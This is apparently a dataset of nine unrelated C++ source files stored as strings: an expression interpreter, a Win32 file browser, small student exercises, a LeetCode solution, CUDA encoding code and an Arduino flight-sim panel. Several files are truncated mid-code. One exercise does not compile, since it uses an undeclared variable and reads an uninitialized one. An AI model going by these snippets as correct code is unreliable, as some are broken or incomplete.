    "\ufeff// interpreter.cpp: \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n//\n\n#include \"interpreter.h\"\n\nusing namespace std;\n\n// token for lexical analysis\n//\nstruct Token {\n\tenum Type { integer, plus, minus, lparen, rparen } type;\n\tstring text;\n\texplicit Token(Type type, const string& text) :type{ type }, text{ text } {}\n\n\tfriend ostream& operator<<(ostream& os, const Token& obj)\n\t{\n\t\treturn os << \"`\" << obj.text << \"`\";\n\t}\n};\n\nvector<Token> lex(const string& input)\n{\n\tvector<Token> result;\n\tfor (int i = 0; i < input.size(); ++i) {\n\t\tswitch (input[i])\n\t\t{\n\t\tcase '+':\n\t\t\tresult.emplace_back(Token::plus, \"+\");\n\t\t\tbreak;\n\t\tcase '-':\n\t\t\tresult.emplace_back(Token::minus, \"-\");\n\t\t\tbreak;\n\t\tcase '(':\n\t\t\tresult.emplace_back(Token::lparen, \"(\");\n\t\t\tbreak;\n\t\tcase ')':\n\t\t\tresult.emplace_back(Token::rparen, \")\");\n\t\t\tbreak;\n\t\tdefault: {\n\t\t\tostringstream buffer;\n\t\t\tbuffer << input[i];\n\t\t\tfor (int j = i+1; j < input.size(); ++j)\n\t\t\t{\n\t\t\t\tif (isdigit(input[j]))\n\t\t\t\t{\n\t\t\t\t\tbuffer << input[j];\n\t\t\t\t\t++i;\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tresult.emplace_back(Token::integer, buffer.str());\n\t\t\t\t\tbuffer.str(\"\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(auto str=buffer.str();str.length() > 0)\n\t\t\t\tresult.emplace_back(Token::integer, str);\n\t\t}\n\t\t}\n\t}\n\treturn result;\n}\n\nstruct Element\n{\n\tvirtual int eval() const = 0;\n};\nstruct Integer : Element\n{\n\tint value;\n\texplicit Integer(const int value) : value(value) {}\n\n\tint eval() const override { return value; }\n\n};\n\nstruct BinaryOperation : Element\n{\n\tenum Type { addition, subtraction } type;\n\tshared_ptr<Element> lhs, rhs;\n\n\tint eval() const override\n\t{\n\t\tif (type == addition)\n\t\t\treturn lhs->eval() + rhs->eval();\n\t\treturn lhs->eval() - rhs->eval();\n\t}\n};\n\nshared_ptr<Element> parse(const vector<Token>& tokens)\n{\n\tauto result = make_unique<BinaryOperation>();\n\tbool have_lhs = false;\n\tfor (int i = 0; i < tokens.size(); i++)\n\t{\n\t\tauto token = tokens[i];\n\t\tswitch (token.type)\n\t\t{\n\t\t\t//process each of tokens\n\t\tcase Token::integer: {\n\t\t\tint value = boost::lexical_cast<int>(token.text);\n\t\t\tauto integer = make_shared<Integer>(value);\n\t\t\tif (!have_lhs) {\n\t\t\t\tresult->lhs = integer;\n\t\t\t\thave_lhs = true;\n\t\t\t}\n\t\t\telse result->rhs = integer;\n\t\t\tbreak;\n\t\t}\n\t\tcase Token::plus:\n\t\t\tresult->type = BinaryOperation::addition;\n\t\t\tbreak;\n\t\tcase Token::minus:\n\t\t\tresult->type = BinaryOperation::subtraction;\n\t\t\tbreak;\n\t\tcase Token::lparen: {\n\t\t\tint j = i;\n\t\t\tfor (; j < tokens.size(); ++j)\n\t\t\t{\n\t\t\t\tif (tokens[j].type == Token::rparen)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tvector<Token> subexpression(&tokens[i + 1], &tokens[j]);\n\t\t\tauto element = parse(subexpression);\n\t\t\tif (!have_lhs)\n\t\t\t{\n\t\t\t\tresult->lhs = element;\n\t\t\t\thave_lhs = true;\n\t\t\t}\n\t\t\telse result->rhs = element;\n\t\t\ti = j;//advance\n\t\t\tbreak;\n\t\t}\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn result;\n}\n\nvoid test01()\n{\n\tstring input{ \"(13-4)-(12+1)\" };\n\tauto tokens = lex(input);\n\tauto parsed = parse(tokens);\n\tcout << input << \" = \" << parsed->eval() << endl;\n}\n\nint main()\n{\n\tcout << \"Hello CMake.\" << endl;\n\ttest01();\n\treturn 0;\n}\n",
    "#pragma region MyRegionField\n#include <Windows.h>\n#include <string>\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <shlobj.h>\n#include <stdio.h>\n#include \"FileDetail.h\"\n#include \"resource1.h\"\n#include <sstream>\n#include <codecvt>\n#include <commctrl.h>\n#include <thread>\n#include <Shobjidl.h> // For ITaskbarList3\n#include <map>\n#include <atomic>\n#define _CRTDBG_MAP_ALLOC\n#include <crtdbg.h>\n#include <richedit.h>\n#pragma endregion\n\n#pragma region fromOtherClasses\n\n#pragma comment(lib, \"comctl32.lib\")\n\nextern LPWSTR ConvertDWORDToLPWSTR(DWORD value);\nextern std::wstring floatToWString(float value);\nextern LPWSTR wStringToLPWSTR(const std::wstring& str);\nextern LPWSTR FileTimeToLPWSTR(const FILETIME& ft);\nextern bool isWithinRange(int num, int target, int range);\nextern int rangeOfRange(HWND hTrackBar, HWND hRadioButton2, HWND hRadioButton3);\nextern void GetFilesInDirectory(std::vector<FileDetail>& out,std::wstring& directory);\nextern LPWSTR forlvTabs(const wchar_t tabsName[256]);\nextern std::wstring easyViewSizeThing(DWORD value);\nextern bool IsValidLocalPath(const wchar_t* path);\nextern void InitializeListViewColumns(HWND hListBox);\nextern void CenterWindow(HWND hWnd);\n\n#pragma endregion\n\nLRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wPAram, LPARAM lParam);\n\n#pragma region defineGlobalObjects\nHWND hMainWindow;\nHINSTANCE hMainInstance;\nHWND hTxtInput;\nHWND hButton;\nHWND hButtonRepeat;\nHWND hListView;\nHWND hStatic;\nHWND hDinamicLbl;\nHWND hTrackBar;\nHWND hRadioButton1;\nHWND hRadioButton2;\nHWND hRadioButton3;\nHWND hTreeView;\nHWND hButtonRefresh;\nHWND hStopButton;\nHWND hProgressBar;\nHWND hButtonInfo;\nHWND hTabControl, hStatic1, hStatic2, hStatic3, hPopup;\nHINSTANCE hInst;\n\n\n#define IDC_TEXTBOX 1000\n#define IDC_BUTTON 1001\n#define IDC_STATIC 1002\n#define IDC_LISTVIEW 1003\n#define IDC_LABEL 1004\n#define IDC_DLABEL 1005\n#define IDC_TBAR 1006\n#define IDC_RBUTTON1 1007\n#define IDC_RBUTTON2 1008\n#define IDC_RBUTTON3 1009\n#define IDC_STATICFC 1010\n#define IDC_TREEVIEW 1012\n#define IDC_BUTTONRPT 1013\n#define IDC_BUTTONLOAD 1014\n#define ID_CONTEXT_MENU_ITEM1  1015\n#define ID_CONTEXT_MENU_ITEM2  1016\n#define ID_CONTEXT_MENU_LITEM1  1017\n#define ID_CONTEXT_MENU_LITEM2  1018\n#define ID_CONTEXT_MENU_OPEN_FILE 1019\n#define IDC_STOPBUTTON 1020\n#define IDC_PROGRESSBAR 1021\n#define IDC_BUTTONINFO 1022\n\n#define WM_UPDATE_PROGRESS (WM_USER + 1)\n\n\n\n\n//#pragma comment(linker, \"/SUBSYSTEM:WINDOWS\")\nusing namespace std;\n\n\nstd::map<int, std::vector<FileDetail>> indexPurposes;\nint index = 0;\nint iterationOFLB = 0;\nHIMAGELIST hImageList = nullptr;\nint howmany = 0;\nint indexForMenu2 = -1;\nstd::vector<int> selectedIndexes;\nstd::atomic<bool> isTaskRunning = false;\nstd::atomic<bool> stopFlag{ false };\n#pragma endregion\n\n#pragma region forUtility\n\nvoid AddItemsToTreeView(HWND hTreeView) {\n\tTVINSERTSTRUCT tvis = { 0 };\n\ttvis.hInsertAfter = TVI_LAST;\n\tint showedFile = -1;\n\tint index = 0;\n\n\tfor (int i = 0; i < indexPurposes.size(); ++i) {\n\t\t\tshowedFile++;\n\n\t\t\tstd::wstring buffer = L\"(\" + std::to_wstring(indexPurposes[i].size()) + L\") \" + indexPurposes[i][0].getFName();\n\t\t\tLPWSTR lpwstrBuffer = const_cast<LPWSTR>(buffer.c_str());\n\n\t\t\ttvis.hParent = TVI_ROOT;\n\t\t\ttvis.item.mask = TVIF_TEXT | TVIF_IMAGE | TVIF_SELECTEDIMAGE | TVIF_PARAM;\n\t\t\ttvis.item.pszText = lpwstrBuffer;\n\t\t\ttvis.item.lParam = index; \n\t\t\tint rootIconIndex = indexPurposes[i][0].getfIconIndex();\n\t\t\ttvis.item.iImage = rootIconIndex;\n\t\t\ttvis.item.iSelectedImage = rootIconIndex;\n\t\t\tHTREEITEM hRoot = TreeView_InsertItem(hTreeView, &tvis);\n\t\t\tindex++;\n\t\t\n\t}\n}\nvoid AddItemsToListView(int iterationgNumber) {\n\tLVITEM lvI = { 0 };\n\tlvI.mask = LVIF_TEXT | LVIF_STATE | LVIF_IMAGE;\n\tListView_SetImageList(hListView, hImageList, LVSIL_SMALL);\n\tfor (size_t i = 0; i < indexPurposes[iterationgNumber].size(); ++i) {\n\t\tlvI.iSubItem = 0;\n\t\tlvI.cchTextMax = 40;\n\t\tlvI.state = INDEXTOSTATEIMAGEMASK(1);\n\t\tlvI.stateMask = LVIS_STATEIMAGEMASK | LVIS_SELECTED | LVIS_FOCUSED;\n\n\t\tint itemCount = ListView_GetItemCount(hListView);\n\t\tlvI.iItem = itemCount;\n\t\tlvI.pszText = wStringToLPWSTR(indexPurposes[iterationgNumber][i].getFName());\n\t\tint iconIndex = indexPurposes[iterationgNumber][i].getfIconIndex();\n\t\tlvI.iImage = iconIndex;\n\n\t\tif (ListView_InsertItem(hListView, &lvI) == -1) {\n\t\t\tMessageBox(NULL, L\"Failed to insert item into ListView.\", L\"Error\", MB_ICONERROR);\n\t\t\treturn;\n\t\t}\n\t\tlvI.pszText = FileTimeToLPWSTR(indexPurposes[iterationgNumber][i].getFCreatedAt());\n\t\tListView_SetItemText(hListView, itemCount, 1, lvI.pszText);\n\n\t\tlvI.pszText = FileTimeToLPWSTR(indexPurposes[iterationgNumber][i].getFLastChangedAt());\n\t\tListView_SetItemText(hListView, itemCount, 2, lvI.pszText);\n\n\t\tlvI.pszText = ConvertDWORDToLPWSTR(indexPurposes[iterationgNumber][i].getFSize());\n\t\tListView_SetItemText(hListView, itemCount, 3, lvI.pszText);\n\n\t\tstd::wstring embracing = easyViewSizeThing(indexPurposes[iterationgNumber][i].getFSize());\n\t\tlvI.pszText = wStringToLPWSTR(embracing);\n\t\tListView_SetItemText(hListV",
    "#include <iostream>\nusing namespace std;\n\ndouble calc(int total_lectures, int lectures_taken)\n{\n    return (lectures_taken*100)/total_lectures;\n}\nint main() {\n\n    int totalStudents = 0, eligibleStudents = 0;\n    char choice;\n    cout<<\"Welcome to Attendance Tracking System\"<<endl;\n\n    do {\n        int total_lectures, lectures_taken;\n        cout<<\"Enter the total number of classes: \"<<endl;\n        cin>> total_lectures;\n        cout<< \"Enter the number of classes attended: \"<<endl;\n        cin>> lectures_taken;\n\n        double percentage= calc(total_lectures, lectures_taken);\n        cout<< \"Total Percentage: \"<<percentage<<\"%\"<<endl;\n\n        if (percentage >= 75.0) {\n            cout << \"Eligible for the exam.\" << endl;\n            eligibleStudents++;\n        } else {\n            cout << \"Not eligible for the exam.\" << endl;\n        }\n\n        totalStudents++;\n        cout << \"Do you want to enter details for another student? (y/n): \";\n        cin >> choice;\n        cout << endl;\n    } while (choice == 'y' || choice == 'Y');\n\n   \n    cout << \"Total Students registered: \" << totalStudents << endl;\n    cout << \"Students Eligible for Exam: \" << eligibleStudents << endl;\n\n    return 0;\n}\n\n",
    "#include \"C:\\Users\\7501\\Downloads\\projects\\Projects_MCW\\utilities\\include\\Compareoutput.h\"\n#include <iomanip>  // For setting precision\n#include <cmath>    // For rounding function\n\n// Function to round a number to a specific number of decimal places\ndouble Comparison::roundToPrecision(double value, int precision) {\n    double factor = std::pow(10.0, precision);\n    return std::round(value * factor) / factor;\n}\n\n\nvoid Comparison::compareFiles(const std::string& file1, const std::string& file2) {\n    std::vector<std::string> values1, values2;\n    std::vector<std::string> classes1, classes2;\n\n    // Parse both files\n    parseFile(file1, values1, classes1);\n    parseFile(file2, values2, classes2);\n\n    // Compare the values with limited precision\n    compareValues(values1, values2, classes1, classes2);\n}\n\nvoid Comparison::parseFile(const std::string& filePath, std::vector<std::string>& values, std::vector<std::string>& classes) {\n    std::ifstream file(filePath);\n    std::string line;\n    while (getline(file, line)) {\n        size_t valuePos = line.find(\"Value: \");\n        if (valuePos != std::string::npos) {\n            size_t classPos = line.find(\"Class: \");\n            std::string value = line.substr(valuePos + 7, classPos - valuePos - 7);\n            std::string className = line.substr(classPos + 7);\n\n            values.push_back(value);\n            classes.push_back(className);\n        }\n    }\n}\n\nvoid Comparison::compareValues(const std::vector<std::string>& values1, const std::vector<std::string>& values2, const std::vector<std::string>& classes1, const std::vector<std::string>& classes2) {\n    if (values1.size() != values2.size() || classes1.size() != classes2.size()) {\n        std::cerr << \"Error: The number of values or classes do not match between the files!\" << std::endl;\n        return;\n    }\n\n    for (size_t i = 0; i < values1.size(); ++i) {\n        // Convert the string values to double for comparison\n        double value1 = std::stod(values1[i]);\n        double value2 = std::stod(values2[i]);\n\n        // Round both values to 5 decimal places\n        value1 = roundToPrecision(value1, 3);\n        value2 = roundToPrecision(value2, 3);\n\n        // Compare rounded values\n        if (value1 == value2) {\n            std::cout << \"Value: \" << value1 << \", Class: \" << classes1[i] << std::endl;\n        } else {\n            std::cout << \"Mismatch at index \" << i << std::endl;\n            std::cout << \"File 1 - Value: \" << value1 << \", Class: \" << classes1[i] << std::endl;\n            std::cout << \"File 2 - Value: \" << value2 << \", Class: \" << classes2[i] << std::endl;\n        }\n    }\n\n    // Compare highest values and predictions with precision\n    double highestValue1 = std::stod(values1.back());\n    double highestValue2 = std::stod(values2.back());\n    highestValue1 = roundToPrecision(highestValue1, 5);\n    highestValue2 = roundToPrecision(highestValue2, 5);\n\n    if (highestValue1 == highestValue2) {\n        std::cout << \"Highest Value: \" << highestValue1 << std::endl;\n        std::cout << \"Predicted Class: \" << classes1.back() << std::endl;\n    } else {\n        std::cout << \"Mismatch in highest value prediction.\" << std::endl;\n    }\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\n\r\nstruct Tugas {\r\n    int id;\r\n    std::string deskripsi;\r\n    std::string petugas;\r\n    bool selesai;\r\n};\r\n\r\nclass ManajemenKebersihan {\r\nprivate:\r\n    std::vector<Tugas> daftarTugas;\r\n    int nextId;\r\n\r\npublic:\r\n    ManajemenKebersihan() : nextId(1) {}\r\n\r\n    \r\n    void tambahTugas() {\r\n        std::string deskripsi, petugas;\r\n        \r\n        std::cout << \"Deskripsi tugas: \";\r\n        std::getline(std::cin, deskripsi);\r\n        std::cout << \"Nama petugas: \";\r\n        std::getline(std::cin, petugas);\r\n\r\n        if (!deskripsi.empty() && !petugas.empty()) {\r\n            daftarTugas.push_back({nextId++, deskripsi, petugas, false});\r\n            std::cout << \"Tugas ditambahkan!\\n\";\r\n        } else {\r\n            std::cout << \"Deskripsi dan petugas harus diisi!\\n\";\r\n        }\r\n    }\r\n\r\n    \r\n    void tampilkanTugas() {\r\n        if (daftarTugas.empty()) {\r\n            std::cout << \"Tidak ada tugas.\\n\";\r\n            return;\r\n        }\r\n\r\n        std::cout << \"\\nDaftar Tugas:\\n\";\r\n        for (const auto& tugas : daftarTugas) {\r\n            std::cout << tugas.id << \". \" << tugas.deskripsi \r\n                     << \" (Petugas: \" << tugas.petugas << \") - \"\r\n                     << (tugas.selesai ? \"Selesai\" : \"Belum selesai\") << \"\\n\";\r\n        }\r\n    }\r\n\r\n    \r\n    void selesaikanTugas() {\r\n        int id;\r\n        std::cout << \"ID tugas yang selesai: \";\r\n        std::cin >> id;\r\n\r\n        for (auto& tugas : daftarTugas) {\r\n            if (tugas.id == id) {\r\n                tugas.selesai = true;\r\n                std::cout << \"Tugas selesai!\\n\";\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"ID tidak ditemukan!\\n\";\r\n    }\r\n};\r\n\r\nint main() {\r\n    ManajemenKebersihan manajer;\r\n    int pilihan;\r\n\r\n    while (true) {\r\n        std::cout << \"\\nMenu:\\n\"\r\n                  << \"1. Tambah Tugas\\n\"\r\n                  << \"2. Lihat Tugas\\n\"\r\n                  << \"3. Selesaikan Tugas\\n\"\r\n                  << \"4. Keluar\\n\"\r\n                  << \"Pilihan: \";\r\n        \r\n        std::cin >> pilihan;\r\n        std::cin.ignore();\r\n\r\n        switch (pilihan) {\r\n            case 1:\r\n                manajer.tambahTugas();\r\n                break;\r\n            case 2:\r\n                manajer.tampilkanTugas();\r\n                break;\r\n            case 3:\r\n                manajer.selesaikanTugas();\r\n                break;\r\n            case 4:\r\n                std::cout << \"Program selesai.\\n\";\r\n                return 0;\r\n            default:\r\n                std::cout << \"Pilihan tidak valid!\\n\";\r\n        }\r\n    }\r\n}",
    "/**\n * @file src/platform/linux/cuda.cpp\n * @brief todo\n */\n#include <bitset>\n#include <fcntl.h>\n#include <filesystem>\n#include <thread>\n\n#include <NvFBC.h>\n#include <ffnvcodec/dynlink_loader.h>\n\nextern \"C\" {\n#include <libavcodec/avcodec.h>\n#include <libavutil/hwcontext_cuda.h>\n#include <libavutil/imgutils.h>\n}\n\n#include \"cuda.h\"\n#include \"graphics.h\"\n#include \"src/logging.h\"\n#include \"src/utility.h\"\n#include \"src/video.h\"\n#include \"wayland.h\"\n\n#define SUNSHINE_STRINGVIEW_HELPER(x) x##sv\n#define SUNSHINE_STRINGVIEW(x) SUNSHINE_STRINGVIEW_HELPER(x)\n\n#define CU_CHECK(x, y) \\\n  if (check((x), SUNSHINE_STRINGVIEW(y \": \"))) return -1\n\n#define CU_CHECK_IGNORE(x, y) \\\n  check((x), SUNSHINE_STRINGVIEW(y \": \"))\n\nnamespace fs = std::filesystem;\n\nusing namespace std::literals;\nnamespace cuda {\n  constexpr auto cudaDevAttrMaxThreadsPerBlock = (CUdevice_attribute) 1;\n  constexpr auto cudaDevAttrMaxThreadsPerMultiProcessor = (CUdevice_attribute) 39;\n\n  void\n  pass_error(const std::string_view &sv, const char *name, const char *description) {\n    BOOST_LOG(error) << sv << name << ':' << description;\n  }\n\n  void\n  cff(CudaFunctions *cf) {\n    cuda_free_functions(&cf);\n  }\n\n  using cdf_t = util::safe_ptr<CudaFunctions, cff>;\n\n  static cdf_t cdf;\n\n  inline static int\n  check(CUresult result, const std::string_view &sv) {\n    if (result != CUDA_SUCCESS) {\n      const char *name;\n      const char *description;\n\n      cdf->cuGetErrorName(result, &name);\n      cdf->cuGetErrorString(result, &description);\n\n      BOOST_LOG(error) << sv << name << ':' << description;\n      return -1;\n    }\n\n    return 0;\n  }\n\n  void\n  freeStream(CUstream stream) {\n    CU_CHECK_IGNORE(cdf->cuStreamDestroy(stream), \"Couldn't destroy cuda stream\");\n  }\n\n  void\n  unregisterResource(CUgraphicsResource resource) {\n    CU_CHECK_IGNORE(cdf->cuGraphicsUnregisterResource(resource), \"Couldn't unregister resource\");\n  }\n\n  using registered_resource_t = util::safe_ptr<CUgraphicsResource_st, unregisterResource>;\n\n  class img_t: public platf::img_t {\n  public:\n    tex_t tex;\n  };\n\n  int\n  init() {\n    auto status = cuda_load_functions(&cdf, nullptr);\n    if (status) {\n      BOOST_LOG(error) << \"Couldn't load cuda: \"sv << status;\n\n      return -1;\n    }\n\n    CU_CHECK(cdf->cuInit(0), \"Couldn't initialize cuda\");\n\n    return 0;\n  }\n\n  class cuda_t: public platf::avcodec_encode_device_t {\n  public:\n    int\n    init(int in_width, int in_height) {\n      if (!cdf) {\n        BOOST_LOG(warning) << \"cuda not initialized\"sv;\n        return -1;\n      }\n\n      data = (void *) 0x1;\n\n      width = in_width;\n      height = in_height;\n\n      return 0;\n    }\n\n    int\n    set_frame(AVFrame *frame, AVBufferRef *hw_frames_ctx) override {\n      this->hwframe.reset(frame);\n      this->frame = frame;\n\n      auto hwframe_ctx = (AVHWFramesContext *) hw_frames_ctx->data;\n      if (hwframe_ctx->sw_format != AV_PIX_FMT_NV12) {\n        BOOST_LOG(error) << \"cuda::cuda_t doesn't support any format other than AV_PIX_FMT_NV12\"sv;\n        return -1;\n      }\n\n      if (!frame->buf[0]) {\n        if (av_hwframe_get_buffer(hw_frames_ctx, frame, 0)) {\n          BOOST_LOG(error) << \"Couldn't get hwframe for NVENC\"sv;\n          return -1;\n        }\n      }\n\n      auto cuda_ctx = (AVCUDADeviceContext *) hwframe_ctx->device_ctx->hwctx;\n\n      stream = make_stream();\n      if (!stream) {\n        return -1;\n      }\n\n      cuda_ctx->stream = stream.get();\n\n      auto sws_opt = sws_t::make(width, height, frame->width, frame->height, width * 4);\n      if (!sws_opt) {\n        return -1;\n      }\n\n      sws = std::move(*sws_opt);\n\n      linear_interpolation = width != frame->width || height != frame->height;\n\n      return 0;\n    }\n\n    void\n    apply_colorspace() override {\n      sws.apply_colorspace(colorspace);\n\n      auto tex = tex_t::make(height, width * 4);\n      if (!tex) {\n        return;\n      }\n\n      // The default green color is ugly.\n      // Update the background color\n      platf::img_t img;\n      img.width = width;\n      img.height = height;\n      img.pixel_pitch = 4;\n      img.row_pitch = img.width * img.pixel_pitch;\n\n      std::vector<std::uint8_t> image_data;\n      image_data.resize(img.row_pitch * img.height);\n\n      img.data = image_data.data();\n\n      if (sws.load_ram(img, tex->array)) {\n        return;\n      }\n\n      sws.convert(frame->data[0], frame->data[1], frame->linesize[0], frame->linesize[1], tex->texture.linear, stream.get(), { frame->width, frame->height, 0, 0 });\n    }\n\n    cudaTextureObject_t\n    tex_obj(const tex_t &tex) const {\n      return linear_interpolation ? tex.texture.linear : tex.texture.point;\n    }\n\n    stream_t stream;\n    frame_t hwframe;\n\n    int width, height;\n\n    // When height and width don't change, it's not necessary to use linear interpolation\n    bool linear_interpolation;\n\n    sws_t sws;\n  };\n\n  class cuda_ram_t: public cuda_t {\n  public:\n    int\n    convert(platf::img_t &img) override {\n      return sws.load_ram(img, tex.array) || sws.convert(frame->data[0]",
    "// https://leetcode.com/problems/letter-combinations-of-a-phone-number/description/\n\nclass Solution {\npublic:\n    int n ;\n    vector<string> ans ;\n\n    void f(int idx , string &temp , unordered_map<char,string> mp , string digits)\n    {\n        if(idx >= n)\n        {\n            ans.push_back(temp) ;\n            return ;\n        }\n\n        char ch = digits[idx] ;\n        string str = mp[ch] ;\n\n        for(int i = 0 ; i < str.size() ; ++i)\n        {\n            temp.push_back(str[i]) ;\n            f(idx + 1 , temp , mp , digits) ;\n            temp.pop_back() ;\n        }\n    }\n    vector<string> letterCombinations(string digits) {\n        n = digits.size() ;\n\n        unordered_map<char,string> mp ;\n\n        if(n == 0)\n        {\n            return {} ;\n        }\n\n        mp['2'] = \"abc\" ;\n        mp['3'] = \"def\" ;\n        mp['4'] = \"ghi\" ;\n        mp['5'] = \"jkl\" ;\n        mp['6'] = \"mno\" ;\n        mp['7'] = \"pqrs\" ;\n        mp['8'] = \"tuv\" ;\n        mp['9'] = \"wxyz\" ;\n\n        string temp = \"\" ;\n\n        f(0 , temp , mp , digits) ;\n\n        return ans ;\n    }\n};\n",
    "// bai13-`.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\nint main()\n{\n   cout << \"tim uoc boi so\\n\";\n   int so;\n   for (int i = 1; i <= so; i++)\n   {\n\t   if (so % i == 0) {\n\t\t   cout << i << \" \";\n\t   }\n\n   }\n\n   cout << \"\\n\\nTim boi so\\n\";\n   for (int i = 1; j <= 10; j++)\n   {\n\t   cout << i * so << \" \";\n   }\n\n\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "/**\n * Copyright \u00a9 2025 Martin Maa\u00df\n * \n * This program is free software: you can redistribute it and/or modify it under the terms of the GNU \n * General Public License as published by the Free Software Foundation, either version 3 of the License, \n * or (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without \n * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n * See the GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License along with Foobar. If not, see \n * <https://www.gnu.org/licenses/>.\n */\n#define DCSBIOS_DISABLE_SERVO\n#define DCSBIOS_DEFAULT_SERIAL\n#include <DcsBios.h>\n#include <Arduino.h>\n#include <MatSwitch3Pos.h>\n#include <MatSwitchWithCover2PosT.h>\n\n#define MATRIX_COLUMN_COUNT 7\n#define MATRIX_ROW_COUNT    9\n\n#define STROBE_PIN 15\n#define DATA_PIN   14\n#define CLOCK_PIN  16\n\nvolatile unsigned char matrix[MATRIX_COLUMN_COUNT][MATRIX_ROW_COUNT] = {\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n  0, 0, 0, 0, 0, 0, 0,\n};\n\nDcsBios::MatActionButtonSet mfk1(\"MFK_1\", &matrix[0][8], HIGH);\nDcsBios::MatActionButtonSet mfk2(\"MFK_2\", &matrix[1][8], HIGH);\nDcsBios::MatActionButtonSet mfk3(\"MFK_3\", &matrix[2][8], HIGH);\nDcsBios::MatActionButtonSet mfkIFF(\"MFK_IFF\", &matrix[3][8], HIGH);\nDcsBios::MatActionButtonSet mfk4(\"MFK_4\", &matrix[0][7], HIGH);\nDcsBios::MatActionButtonSet mfk5(\"MFK_5\", &matrix[1][7], HIGH);\nDcsBios::MatActionButtonSet mfk6(\"MFK_6\", &matrix[2][7], HIGH);\nDcsBios::MatActionButtonSet mfkTune(\"MFK_TUNE\", &matrix[3][7], HIGH);\nDcsBios::MatActionButtonSet mfk7(\"MFK_7\", &matrix[0][6], HIGH);\nDcsBios::MatActionButtonSet mfk8(\"MFK_8\", &matrix[1][6], HIGH);\nDcsBios::MatActionButtonSet mfk9(\"MFK_9\", &matrix[2][6], HIGH);\nDcsBios::MatActionButtonSet mfkScan(\"MFK_SCAN\", &matrix[3][6], HIGH);\nDcsBios::MatActionButtonSet mfkClr(\"MFK_CLR\", &matrix[0][5], HIGH);\nDcsBios::MatActionButtonSet mfk0(\"MFK_0\", &matrix[1][5], HIGH);\nDcsBios::MatActionButtonSet mfkDot(\"MFK_DOT\", &matrix[2][5], HIGH);\n//DcsBios::MatActionButtonSet mfk?(\"MFK_?\", &matrix[3][5], HIGH);\nDcsBios::MatActionButtonSet mfkMinus(\"MFK_MINUS\", &matrix[0][4], HIGH);\nDcsBios::MatActionButtonSet mfkEnter(\"MFK_ENTER\", &matrix[1][4], HIGH);\nDcsBios::MatActionButtonSet mfkIdnt(\"MFK_IDNT\", &matrix[3][4], HIGH);\n\nMatSwitch3Pos mfkAcknowledgeRecall(\"MFK_ACKNOWLEDGE_RECALL\", &matrix[4][8], &matrix[4][7]);\nMatSwitchWithCover2Pos mfkZeroize(\"MFK_ZEROIZE\", \"MFK_ZEROIZE_COVER\", &matrix[4][6], true);\nMatSwitchWithCover2Pos mfkEmergency(\"MFK_EMERGENCY\", \"MFK_EMERGENCY_COVER\",  &matrix[4][5], true);\n\nDcsBios::MatActionButtonSet mfkA(\"MFK_A\", &matrix[0][3], HIGH);\nDcsBios::MatActionButtonSet mfkB(\"MFK_B\", &matrix[1][3], HIGH);\nDcsBios::MatActionButtonSet mfkC(\"MFK_C\", &matrix[2][3], HIGH);\nDcsBios::MatActionButtonSet mfkD(\"MFK_D\", &matrix[3][3], HIGH);\nDcsBios::MatActionButtonSet mfkE(\"MFK_E\", &matrix[4][3], HIGH);\nDcsBios::MatActionButtonSet mfkF(\"MFK_F\", &matrix[5][3], HIGH);\nDcsBios::MatActionButtonSet mfkG(\"MFK_G\", &matrix[6][3], HIGH);\nDcsBios::MatActionButtonSet mfkH(\"MFK_H\", &matrix[0][2], HIGH);\nDcsBios::MatActionButtonSet mfkI(\"MFK_I\", &matrix[1][2], HIGH);\nDcsBios::MatActionButtonSet mfkJ(\"MFK_J\", &matrix[2][2], HIGH);\nDcsBios::MatActionButtonSet mfkK(\"MFK_K\", &matrix[3][2], HIGH);\nDcsBios::MatActionButtonSet mfkL(\"MFK_L\", &matrix[4][2], HIGH);\nDcsBios::MatActionButtonSet mfkM(\"MFK_M\", &matrix[5][2], HIGH);\nDcsBios::MatActionButtonSet mfkN(\"MFK_N\", &matrix[6][2], HIGH);\nDcsBios::MatActionButtonSet mfkO(\"MFK_O\", &matrix[0][1], HIGH);\nDcsBios::MatActionButtonSet mfkP(\"MFK_P\", &matrix[1][1], HIGH);\nDcsBios::MatActionButtonSet mfkQ(\"MFK_Q\", &matrix[2][1], HIGH);\nDcsBios::MatActionButtonSet mfkR(\"MFK_R\", &matrix[3][1], HIGH);\nDcsBios::MatActionButtonSet mfkS(\"MFK_S\", &matrix[4][1], HIGH);\nDcsBios::MatActionButtonSet mfkT(\"MFK_T\", &matrix[5][1], HIGH);\nDcsBios::MatActionButtonSet mfkU(\"MFK_U\", &matrix[6][1], HIGH);\nDcsBios::MatActionButtonSet mfkArrowLeft(\"MFK_ARROW_LEFT\",  &matrix[0][0], HIGH);\nDcsBios::MatActionButtonSet mfkV(\"MFK_V\", &matrix[1][0], HIGH);\nDcsBios::MatActionButtonSet mfkW(\"MFK_W\", &matrix[2][0], 